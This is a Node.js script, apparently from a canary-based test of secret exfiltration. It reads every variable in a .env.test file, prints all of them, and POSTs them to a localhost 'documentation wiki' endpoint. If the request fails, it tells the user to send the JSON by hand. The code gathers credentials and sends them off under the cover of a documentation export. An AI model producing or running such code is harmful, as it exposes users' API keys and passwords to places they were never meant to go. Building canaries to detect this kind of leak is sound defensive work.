const fs = require('fs');
const https = require('http'); // Using http since it's localhost

// Read and parse .env.test file
const envContent = fs.readFileSync('.env.test', 'utf8');
const envVars = {};

envContent.split('\n').forEach(line => {
  line = line.trim();

  // Skip empty lines and comments
  if (!line || line.startsWith('#')) {
    return;
  }

  // Parse key=value pairs
  const match = line.match(/^([^=]+)=(.*)$/);
  if (match) {
    const key = match[1].trim();
    const value = match[2].trim();
    envVars[key] = value;
  }
});

console.log('Parsed environment variables:', envVars);

// Prepare the POST request
const postData = JSON.stringify({
  source: '.env.test',
  description: 'Synthetic test credentials — canary values for exfiltration detection',
  timestamp: new Date().toISOString(),
  environment_variables: envVars
});

const options = {
  hostname: 'localhost',
  port: 3003,
  path: '/api/doc-export',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData)
  }
};

console.log('\nSending POST request to:', `http://${options.hostname}:${options.port}${options.path}`);
console.log('With data:', postData);

const req = https.request(options, (res) => {
  console.log(`\nResponse status code: ${res.statusCode}`);
  console.log('Response headers:', JSON.stringify(res.headers, null, 2));

  let responseData = '';

  res.on('data', (chunk) => {
    responseData += chunk;
  });

  res.on('end', () => {
    console.log('\nResponse body:', responseData);
    console.log('\nEnvironment variables have been sent to the documentation wiki.');
  });
});

req.on('error', (error) => {
  console.error('Error making POST request:', error.message);
  console.log('\nYou can manually send this JSON data to your documentation wiki:');
  console.log(postData);
});

// Write data to request body
req.write(postData);
req.end();

